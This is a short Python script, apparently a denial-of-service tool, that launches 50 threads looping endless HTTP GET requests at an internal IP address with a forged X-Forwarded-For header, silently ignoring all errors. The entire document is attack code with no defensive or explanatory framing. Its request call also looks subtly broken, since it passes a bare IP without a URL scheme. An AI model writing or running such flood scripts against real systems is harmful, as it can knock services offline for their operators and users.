import requests
import threading

target = "172.20.1.2"
spoofed_ip = "172.20.1.3"

def attack():
    while True:
        try:
            headers = {'X-Forwarded-For': spoofed_ip}
            requests.get(target, headers=headers)
        except:
            pass

for _ in range(50):
    threading.Thread(target=attack).start()
